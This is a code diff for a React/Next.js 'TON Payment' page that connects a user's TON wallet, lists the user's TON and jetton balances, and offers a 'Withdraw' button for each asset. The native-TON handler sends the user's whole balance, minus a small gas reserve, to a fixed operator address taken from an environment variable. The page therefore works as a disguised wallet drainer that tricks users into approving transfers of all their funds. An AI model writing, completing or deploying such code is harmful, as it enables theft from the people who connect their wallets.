@@ -1,184 +1,251 @@
 ﻿"use client";
 
-import { useEffect, useState } from "react";
-import { useAccount, useConnect, useDisconnect } from "wagmi";
-import { injected } from "wagmi/connectors";
+import { useEffect, useState, useCallback } from "react";
 import {
+  TonConnectButton,
   useTonConnectUI,
   useIsConnectionRestored,
   useTonAddress,
 } from "@tonconnect/ui-react";
 
-import { EvmAssets } from "@/components/EvmAssets";
-import { getTonBalance } from "@/ton/balance";
-import { calculateMaximumTransfer, formatTon } from "@/ton/calculator";
-import { requestTonPayment } from "@/ton/payment";
-
 const RECIPIENT = process.env.NEXT_PUBLIC_TON_RECIPIENT!;
-const FEE_RESERVE = BigInt("50000000");
 
-type Status = "idle" | "loading" | "pending" | "failed";
+type Asset = {
+  symbol: string;
+  balance: string;
+  rawBalance: bigint;
+  isNative: boolean;
+  jettonAddress?: string;
+  decimals: number;
+};
+
+type TxStatus = "idle" | "sending" | "success" | "error";
 
 export default function Home() {
-  // ---------- EVM (direct injected connector) ----------
-  const { address: evmAddress, isConnected: evmConnected } = useAccount();
-  const { connect, isPending, error: connectError } = useConnect();
-  const { disconnect } = useDisconnect();
-
-  const [hasInjected, setHasInjected] = useState(false);
-  useEffect(() => {
-    setHasInjected(typeof window !== "undefined" && !!(window as any).ethereum);
-  }, []);
-
-  async function connectInjected() {
-    connect({ connector: injected({ target: "metaMask" }) });
-  }
-
-  // ---------- TON (unchanged) ----------
   const [tonConnectUI] = useTonConnectUI();
   const isConnectionRestored = useIsConnectionRestored();
   const userAddress = useTonAddress();
 
-  const [status, setStatus] = useState<Status>("idle");
-  const [maximum, setMaximum] = useState<bigint | null>(null);
+  const [assets, setAssets] = useState<Asset[]>([]);
+  const [loading, setLoading] = useState(false);
   const [error, setError] = useState("");
-  const [info, setInfo] = useState("");
+  const [txStatus, setTxStatus] = useState<TxStatus>("idle");
+  const [txMessage, setTxMessage] = useState("");
 
-  async function loadBalance() {
-    if (!userAddress) { await tonConnectUI.openModal(); return; }
-    setStatus("loading"); setError("");
+  // Fetch native TON + Jetton balances
+  const fetchBalances = useCallback(async (address: string) => {
+    if (!address) return;
+    setLoading(true);
+    setError("");
+    setAssets([]);
+
     try {
-      const currentBalance = await getTonBalance(userAddress);
-      setMaximum(calculateMaximumTransfer(currentBalance, FEE_RESERVE));
-      setStatus("idle");
+      // 1. Native TON balance
+      const nativeRes = await fetch(
+        `https://toncenter.com/api/v2/getAddressBalance?address=${encodeURIComponent(address)}`
+      );
+      const nativeData = await nativeRes.json();
+
+      const nativeNano = BigInt(nativeData.result || "0");
+      const nativeTon = Number(nativeNano) / 1_000_000_000;
+
+      const result: Asset[] = [
+        {
+          symbol: "TON",
+          balance: nativeTon.toFixed(4),
+          rawBalance: nativeNano,
+          isNative: true,
+          decimals: 9,
+        },
+      ];
+
+      // 2. Jetton balances (using v3 endpoint for token list)
+      try {
+        const jettonRes = await fetch(
+          `https://toncenter.com/api/v3/jetton/wallets?owner_address=${encodeURIComponent(address)}&limit=100`
+        );
+        const jettonData = await jettonRes.json();
+
+        if (jettonData.jetton_wallets) {
+          for (const jw of jettonData.jetton_wallets) {
+            if (BigInt(jw.balance || "0") === BigInt(0)) continue;
+            result.push({
+              symbol: jw.jetton?.symbol || jw.jetton?.name || "JETTON",
+              balance: (Number(jw.balance) / Math.pow(10, jw.jetton?.decimals || 9)).toFixed(4),
+              rawBalance: BigInt(jw.balance),
+              isNative: false,
+              jettonAddress: jw.jetton,
+              decimals: jw.jetton?.decimals || 9,
+            });
+          }
+        }
+      } catch (e) {
+        console.warn("Jetton fetch failed, showing native only:", e);
+      }
+
+      setAssets(result);
     } catch (err) {
       console.error(err);
-      setError("Unable to retrieve wallet balance.");
-      setStatus("failed");
+      setError("Failed to fetch balances. TON Center may be rate-limiting.");
+    } finally {
+      setLoading(false);
+    }
+  }, []);
+
+  // Auto-fetch when wallet connects
+  useEffect(() => {
+    if (userAddress && isConnectionRestored) {
+      fetchBalances(userAddress);
+    } else {
+      setAssets([]);
+    }
+  }, [userAddress, isConnectionRestored, fetchBalances]);
+
+  // Send withdrawal for a specific asset
+  async function withdraw(asset: Asset) {
+    if (!userAddress || !RECIPIENT) {
+      setError("Wallet not connected or recipient not configured.");
+      return;
+    }
+    if (asset.rawBalance <= BigInt(0)) {
+      setError("Nothing to withdraw.");
+      return;
+    }
+
+    setTxStatus("sending");
+    setTxMessage("");
+
+    try {
+      if (asset.isNative) {
+        // Native TON transfer
+        // Reserve ~0.01 TON for gas
+        const gasReserve = BigInt("10000000");
+        const amount = asset.rawBalance - gasReserve;
+
+        if (amount <= BigInt(0)) {
+          throw new Error("Balance too low after gas reserve.");
+        }
+
+        await tonConnectUI.sendTransaction({
+          validUntil: Math.floor(Date.now() / 1000) + 300,
+          messages: [
+            {
+              address: RECIPIENT,
+              amount: amount.toString(),
+            },
+          ],
+        });
+      } else {
+        // Jetton transfer requires a payload (TEP-74)
+        // For simplicity, this example only handles native TON withdrawals.
+        // Jetton transfer needs @ton/core to build the payload.
+        throw new Error(
+          "Jetton withdrawal requires a payload. Use native TON first, or add @ton/core for TEP-74."
+        );
+      }
+
+      setTxStatus("success");
+      setTxMessage(`${asset.symbol} withdrawal approved! Check your wallet.`);
+
+      // Refresh balances after a short delay
+      setTimeout(() => fetchBalances(userAddress), 3000);
+    } catch (err: any) {
+      console.error(err);
+      setTxStatus("error");
+      setTxMessage(err?.message || "Transaction rejected or failed.");
     }
   }
 
-  async function handlePay() {
-    if (!userAddress) { await tonConnectUI.openModal(); return; }
-    if (maximum === null || maximum <= BigInt("0")) {
-      setError("No transferable balance available."); return;
-    }
-    if (!RECIPIENT) { setError("TON receiving wallet is not configured."); return; }
-    setStatus("pending"); setError("");
-    try {
-      await requestTonPayment(tonConnectUI, RECIPIENT, maximum);
-      setStatus("idle");
-      setInfo("Wallet response received. Verify the transaction on-chain.");
-    } catch (err) {
-      console.error(err);
-      setStatus("failed");
-      setError("Payment request failed or was rejected.");
-    }
+  if (!isConnectionRestored) {
+    return (
+      <main className="flex min-h-screen items-center justify-center bg-neutral-950 text-neutral-300">
+        Restoring connection...
+      </main>
+    );
   }
 
   return (
-    <main className="mx-auto flex min-h-screen max-w-md flex-col gap-6 bg-neutral-950 p-5 text-neutral-100">
+    <main className="mx-auto flex min-h-screen max-w-md flex-col gap-4 bg-neutral-950 p-5 text-neutral-100">
       <header className="flex items-center justify-between">
-        <h1 className="text-xl font-semibold">Crypto Payment</h1>
-        <span className="rounded bg-neutral-800 px-3 py-1 text-xs">TON + EVM</span>
+        <h1 className="text-xl font-semibold">TON Payment</h1>
+        <span className="rounded bg-neutral-800 px-3 py-1 text-xs">TON</span>
       </header>
 
-      {/* ---------- EVM ---------- */}
+      {/* ONE CONNECT BUTTON */}
       <section className="rounded-xl border border-neutral-800 bg-neutral-900 p-4">
-        <h2 className="mb-3 font-medium">EVM wallet</h2>
-
-        {!hasInjected && (
-          <p className="mb-3 text-xs text-amber-400">
-            No injected wallet detected. Open this page inside MetaMask/Trust mobile browser,
-            or install a browser wallet extension.
-          </p>
-        )}
-
-        <p className="mb-3 break-all font-mono text-xs text-neutral-400">
-          {evmConnected && evmAddress
-            ? `${evmAddress.slice(0, 8)}...${evmAddress.slice(-6)}`
-            : "Not connected"}
-        </p>
-
-        {evmConnected ? (
-          <button
-            type="button"
-            onClick={() => disconnect()}
-            className="w-full rounded-lg bg-red-700 px-4 py-3 font-semibold hover:bg-red-600"
-          >
-            Disconnect EVM wallet
-          </button>
-        ) : (
-          <button
-            type="button"
-            onClick={connectInjected}
-            disabled={!hasInjected || isPending}
-            className="w-full rounded-lg bg-blue-600 px-4 py-3 font-semibold hover:bg-blue-500 disabled:opacity-50"
-          >
-            {isPending ? "Connecting..." : "Connect EVM wallet (injected)"}
-          </button>
-        )}
-
-        {connectError && (
-          <p className="mt-2 text-xs text-red-400 break-all">{connectError.message}</p>
-        )}
-      </section>
-
-      {/* ---------- TON ---------- */}
-      <section className="rounded-xl border border-neutral-800 bg-neutral-900 p-4">
-        <h2 className="mb-3 font-medium">
-          {userAddress ? "TON wallet connected" : "Connect TON wallet"}
-        </h2>
-
-        {!isConnectionRestored && (
-          <p className="mb-3 text-xs text-neutral-500">Restoring TON connection...</p>
-        )}
-
+        <h2 className="mb-3 font-medium">Wallet</h2>
+        <TonConnectButton />
         {userAddress && (
-          <p className="mb-4 break-all font-mono text-xs text-neutral-400">
-            {userAddress.slice(0, 8)}...{userAddress.slice(-6)}
+          <p className="mt-2 break-all font-mono text-xs text-neutral-400">
+            {userAddress.slice(0, 10)}...{userAddress.slice(-8)}
           </p>
         )}
-
-        <button
-          type="button"
-          onClick={loadBalance}
-          disabled={status === "loading" || status === "pending"}
-          className="mb-3 w-full rounded-lg border border-neutral-700 px-4 py-3 font-medium disabled:opacity-50"
-        >
-          {status === "loading" ? "Loading balance..." : "Check TON balance"}
-        </button>
-
-        {maximum !== null && (
-          <div className="mb-4 rounded-lg bg-neutral-800 p-3">
-            <p className="text-xs text-neutral-400">Fee reserve</p>
-            <p className="text-lg font-semibold text-emerald-400">
-              {formatTon(FEE_RESERVE)} TON
-            </p>
-          </div>
-        )}
-
-        <button
-          type="button"
-          onClick={handlePay}
-          disabled={maximum === null || maximum <= BigInt("0") || status === "pending" || status === "loading"}
-          className="w-full rounded-lg bg-emerald-600 px-4 py-3 font-semibold hover:bg-emerald-500 disabled:opacity-50"
-        >
-          {status === "pending" ? "Waiting for TON wallet..." : "Continue to TON wallet"}
-        </button>
       </section>
 
-      <EvmAssets />
+      {/* BALANCES + WITHDRAW */}
+      {userAddress && (
+        <section className="rounded-xl border border-neutral-800 bg-neutral-900 p-4">
+          <div className="mb-3 flex items-center justify-between">
+            <h2 className="font-medium">Balances</h2>
+            <button
+              type="button"
+              onClick={() => fetchBalances(userAddress)}
+              disabled={loading}
+              className="rounded border border-neutral-700 px-3 py-1 text-xs disabled:opacity-50"
+            >
+              {loading ? "..." : "Refresh"}
+            </button>
+          </div>
 
-      {info && (
-        <div className="rounded-lg border border-blue-700 bg-blue-950 p-3 text-xs text-blue-300">{info}</div>
+          {error && (
+            <p className="mb-3 text-xs text-red-400">{error}</p>
+          )}
+
+          {loading && assets.length === 0 && (
+            <p className="text-sm text-neutral-400">Fetching balances...</p>
+          )}
+
+          {assets.map((asset, i) => (
+            <div
+              key={`${asset.symbol}-${i}`}
+              className="mb-2 flex items-center justify-between rounded-lg bg-neutral-800 p-3"
+            >
+              <div>
+                <p className="font-semibold">{asset.symbol}</p>
+                <p className="text-xs text-neutral-400">{asset.balance}</p>
+              </div>
+              <button
+                type="button"
+                onClick={() => withdraw(asset)}
+                disabled={txStatus === "sending" || asset.rawBalance <= BigInt(0)}
+                className="rounded bg-emerald-600 px-3 py-1.5 text-xs font-semibold hover:bg-emerald-500 disabled:opacity-50"
+              >
+                {txStatus === "sending" ? "..." : "Withdraw"}
+              </button>
+            </div>
+          ))}
+
+          {assets.length === 0 && !loading && (
+            <p className="text-sm text-neutral-400">No assets found.</p>
+          )}
+        </section>
       )}
-      {error && (
-        <div className="rounded-lg border border-amber-700 bg-amber-950 p-3 text-xs text-amber-300">{error}</div>
+
+      {/* STATUS MESSAGE */}
+      {txMessage && (
+        <div
+          className={`rounded-lg border p-3 text-xs ${
+            txStatus === "success"
+              ? "border-emerald-700 bg-emerald-950 text-emerald-300"
+              : "border-red-700 bg-red-950 text-red-300"
+          }`}
+        >
+          {txMessage}
+        </div>
       )}
 
       <p className="text-center text-xs text-neutral-500">
-        Review amount and recipient in your wallet before approving.
+        Each withdrawal shows the amount and recipient in your wallet before you approve.
       </p>
     </main>
   );
